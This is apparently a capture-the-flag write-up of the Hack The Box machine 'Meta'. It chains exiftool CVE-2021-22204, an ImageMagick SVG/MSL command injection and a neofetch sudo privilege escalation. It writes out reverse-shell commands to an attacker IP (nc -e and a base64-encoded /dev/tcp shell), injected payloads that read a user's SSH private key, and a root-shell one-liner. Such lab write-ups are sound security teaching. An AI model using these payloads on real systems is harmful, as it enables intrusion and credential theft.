---
title: "HTB - Meta"
categories: [box]
date: 2022-10-29
comments: true
image: /images/walkthroughs/hackthebox/meta/logo.png
favicon: /images/walkthroughs/hackthebox/meta/logo.png
description: HTB - Meta walkthrough
---

# Meta

<p align="center">
  <h2> Meta </h2>
  <img src="/images/walkthroughs/hackthebox/meta/logo.png" width="30%"/>
</p>


## Summary

Meta is a medium box where we land into a plain website with nothing to do. We have to check for subdomains to find the dev01 subdomain (the clue was in the text, talking about a new up on developement). Once we found it we analyze it, turns to be a wrapper of the _exiftool_ command. We have to use CVE-2021-22204 to trigger RCE and do a revshell. 

Once inside, we land as www-data. Using a ImageMagick vulnerability we can execute as the user that it's running a script with cron, this user is thomas. After crafting a SVG payload, we get the SSH keys for thomas and get the user flag.

For privilege escalation we can run neofetch with SUDO keeping the XDG_CONFIG_HOME environment variable (it sets where the config file lies). We cannot use any argument with the sudo command due to the \"\" at the end, so we will use thaty variable to set our custom config file. The config file gets executed alongside the neofetch command, so we can introduce our payload and then use SUDO with the XDG_CONFIG_HOME set to the convenient folder so it gets executed, poping up a shell as root.


## Enumeration

nmap:


```bash
Nmap scan report for 10.129.228.20
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We add the artcorp.htb domain into the /etc/hosts


```bash
gobuster dir -u "http://artcorp.htb" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 10  
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artcorp.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 12:43:17 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/assets               (Status: 301) [Size: 234] [--> http://artcorp.htb/assets/]
/css                  (Status: 301) [Size: 231] [--> http://artcorp.htb/css/]
/index.html           (Status: 200) [Size: 4427]
/server-status        (Status: 403) [Size: 199]

gobuster dir -u "http://artcorp.htb/assets" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 10 -x php,html,txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artcorp.htb/assets
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/11/02 13:07:21 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 238] [--> http://artcorp.htb/assets/img/]
```


We have a website saying that their new product is going to launch called MetaView:

```
Development in progress

We are almost ready to launch our new product "MetaView".

The product is already in testing phase.
Stay tuned!
```


<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/1_0_web.png" width="90%"/>
</p>


Also we can see that one of the team members is a PHP developer, so we will asume that this is PHP.

- Debian 10.13 Buster


After enumerating subdomains we can see the following one: _dev01.artcorp.htb_

```bash
ffuf -c -u 'http://artcorp.htb' -H 'Host: FUZZ.artcorp.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/

# I missed the output of the fuzzing, but here you can find the dev01 subdomain.
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/1_1_dev.png" width="90%"/>
</p>

It is used to check metadata within a file. And we have a file upload:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/1_2_upload.png" width="90%"/>
</p>

It only allow us to upload PNG/JPEG:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/1_3_only.png" width="90%"/>
</p>

- Content-Type bypass (image/jpeg) not working
- File extension bypass not working
- Command injection at the end of the filename didn't get executed



```bash
gobuster dir -u "http://dev01.artcorp.htb/metaview" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 10 -x php,html,txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev01.artcorp.htb/metaview
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/11/02 13:24:18 Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 199]
...
/assets               (Status: 301) [Size: 249] [--> http://dev01.artcorp.htb/metaview/assets/]
/css                  (Status: 301) [Size: 246] [--> http://dev01.artcorp.htb/metaview/css/]
/index.php            (Status: 200) [Size: 1404]
/index.php            (Status: 200) [Size: 1404]
/lib                  (Status: 301) [Size: 246] [--> http://dev01.artcorp.htb/metaview/lib/]
/uploads              (Status: 301) [Size: 250] [--> http://dev01.artcorp.htb/metaview/uploads/]
/vendor               (Status: 301) [Size: 249] [--> http://dev01.artcorp.htb/metaview/vendor/]

gobuster dir -u "http://dev01.artcorp.htb/metaview/vendor" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 30 -x php,html,txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev01.artcorp.htb/metaview/vendor
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2022/11/02 17:55:58 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 199]
/.htm.htm.html        (Status: 403) [Size: 199]
/autoload.php         (Status: 200) [Size: 0]
/.hta                 (Status: 403) [Size: 199]
/composer             (Status: 301) [Size: 258] [--> http://dev01.artcorp.htb/metaview/vendor/composer/]
/LICENSE              (Status: 301) [Size: 2919] [--> http://dev01.artcorp.htb/metaview/vendor/composer/LICENSE]


```

We have an uploads folder, but the files I uploaded doesn't show on that folder... If so we could try to bypass the filter an upload a WebShell.

First try with injections didn't work out. I tried to place a command within the Artist metadata:

```bash
kali@kali:~/Desktop/HackTheBox/Meta$ exiftool -artist=\`id\` test.png
    1 image files updated
                                                                                                                                                                                             
kali@kali:~/Desktop/HackTheBox/Meta$ exiftool test.png               
ExifTool Version Number         : 12.44
File Name                       : test.png
Directory                       : .
File Size                       : 643 bytes
File Modification Date/Time     : 2022:11:02 13:36:51-04:00
File Access Date/Time           : 2022:11:02 13:36:51-04:00
File Inode Change Date/Time     : 2022:11:02 13:36:51-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 36
Image Height                    : 26
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Artist                          : `id`
Image Size                      : 36x26
Megapixels                      : 0.000936

```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/2_0_first_try.png" width="90%"/>
</p>

Due to the format of the output I believe that the displayed info is directly taken from the exiftool command. I will focus again on command injection.


```bash
exiftool -Comment='<?php system("nc 10.10.14.2 5454 -e /bin/bash"); ?>'
exiftool -Comment='<?php exec("ls") ?>'
```

But our payload does not get interpreted:

```php
<pre>File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 36
Image Height                    : 26
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Artist                          : `id`
Comment                         : <!--?php system("nc 10.10.14.2 5454 -e /bin/bash"); ?-->
</pre>
```

Going for friendly payloads, we can inject HTML code but nothing further than that:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/2_1_reflect.png" width="90%"/>
</p>

We have the composer directory, which probably means that the composer component is installed. We can look for any configuration file using the [default directory tree](https://stackoverflow.com/questions/31401495/directory-structure-for-a-php-website-using-composer-gulp-and-travis). On the composer.json file we can see the exiftool wrapper, then we can confirm that it is running underneath:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/3_0_composer.png" width="70%"/>
</p>


One of the well-known exiftool exploits is [CVE-2021-22204](https://github.com/convisolabs/CVE-2021-22204-exiftool). Using this exploit we can craft a custom file that can exploit the eval function in the exiftool. Replace the IP and port for the reverse shell and we are in once we upload the photo:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/4_0_in.png" width="70%"/>
</p>


## Lateral movement

With pspy64 we can see the following commands running:

```bash
2022/11/03 18:30:01 CMD: UID=0    PID=16921  | /usr/sbin/CRON -f 
2022/11/03 18:30:01 CMD: UID=0    PID=16920  | cp -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
2022/11/03 18:30:01 CMD: UID=0    PID=16922  | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 
2022/11/03 18:30:01 CMD: UID=0    PID=16923  | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 
2022/11/03 18:30:01 CMD: UID=1000 PID=16924  | /bin/bash /usr/local/bin/convert_images.sh 
2022/11/03 18:30:01 CMD: UID=1000 PID=16925  | /usr/local/bin/mogrify -format png *.* 
2022/11/03 18:30:01 CMD: UID=1000 PID=16926  | pkill mogrify 
```

We have three commands running as user thomas, they look promising. Within that convert_images.sh we have the following code:

```bash
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

We have the following version of ImageMagick, which is vulnerable:

```bash
www-data@meta:/usr/local/bin$ mogrify --version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```

In this [post](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) we can see a command injection vulnerability using PDFs as input files. We don't need to have a PDF inside, we just use the _pdf:_ protocol handler which is vulnerable to command injection.

```xml
<image authenticate='ff" `echo $(id)> ./0wned`;"'>
  <read filename="pdf:/tmp/user.txt"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Making some test we can see the 0wned file with the output of the command:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/6_0_mogri.png" width="70%"/>
</p>

After some test I found that we cannot use the tmp directory as output for the thomas execution, so better to drop it on the dev folder:


```xml
<!-- Dropping if there are any SSH keys -->
<image authenticate='ff" `echo $(ls /home/thomas/.ssh)> /dev/shm/.kash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:kash.svg" height="100" width="100"/>
  </svg>
</image>

<!-- Yes, there was, so we leak them -->
<image authenticate='ff" `echo $(cat /home/thomas/.ssh/id_rsa)> /dev/shm/.kash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:kash.svg" height="100" width="100"/>
  </svg>
</image>
```

We can see how the command gets executed within the command injection. Sometimes, pspy64 does not catch the injecteds process, but I show this to locate where is the injection and why the designer used that payload:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/6_1_exe.png" width="90%"/>
</p>


With the SSH keys we can get in and retreive the user.txt

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/7_0_in.png" width="70%"/>
</p>


We can also try to make a reverse shell by encoding it in base64. This is the best option since dots, redirections and complex revshell commands didn't work out for me:

```bash
echo 'bash  -i >& /dev/tcp/10.10.14.2/5453  0>&1  ' | base64
  YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi81NDUzICAwPiYxICAK
```

```xml
<image authenticate='ff" `echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi81NDUzICAwPiYxICAK" | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:kash.svg" height="100" width="100"/>
  </svg>
</image>
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/7_1_in.png" width="90%"/>
</p>



## Privesc

With sudo -l we can see the following command

```bash
thomas@meta:/tmp$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"

# GTFOBin:
sudo /usr/bin/neofetch \"\" --config $TF
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/7_2_neo.png" width="90%"/>
</p>

The \"\" is preventing from appending the GTFOBin but the env_keep set caught my eye. From this [post](https://superuser.com/questions/365847/where-should-the-xdg-config-home-variable-be-defined). We can export the XDG_CONFIG_HOME variable to set it to the thomas config directory.
Recalling the pspy64, we saw that the file is being rewritten form a copy on the root config directory.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/5_0_pspy.png" width="90%"/>
</p>


As GTFOBin suggest for this command, we can include this line into the config file and it will be executed as root. Then we have to set the .config directory to be out target configuration. We can do it using the [XDG_CONFIG_HOME environment varible](https://superuser.com/questions/365847/where-should-the-xdg-config-home-variable-be-defined). It will remain as a valid variable on the sudo execution, overwritting the current configuration file and executing our payload:

```bash
thomas@meta:~/.config/neofetch$ echo "exec /bin/bash" > config.conf 
thomas@meta:~/.config/neofetch$ XDG_CONFIG_HOME=/home/thomas/.config sudo neofetch
root@meta:/home/thomas/.config/neofetch# id
uid=0(root) gid=0(root) groups=0(root)
```

Now we can grab our flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/meta/8_0_root.png" width="90%"/>
</p>



